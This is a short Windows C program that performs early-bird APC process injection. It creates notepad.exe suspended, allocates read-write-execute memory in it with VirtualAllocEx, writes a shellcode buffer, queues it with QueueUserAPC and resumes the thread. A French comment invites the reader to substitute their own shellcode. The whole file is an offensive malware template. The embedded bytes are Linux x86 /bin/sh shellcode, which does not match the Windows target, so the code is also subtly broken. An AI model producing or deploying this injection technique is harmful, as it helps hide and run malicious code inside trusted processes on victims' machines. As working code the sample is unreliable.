#include <windows.h>
#include <stdio.h>

int main() {
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    char targetPath[] = "C:\\Windows\\System32\\notepad.exe";
    unsigned char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"; // Remplacez par votre shellcode

    if (CreateProcess(NULL, targetPath, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        LPVOID remoteMemory = VirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (remoteMemory) {
            WriteProcessMemory(pi.hProcess, remoteMemory, shellcode, sizeof(shellcode), NULL);
            QueueUserAPC((PAPCFUNC)remoteMemory, pi.hThread, 0);
            ResumeThread(pi.hThread);
        }
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    return 0;
}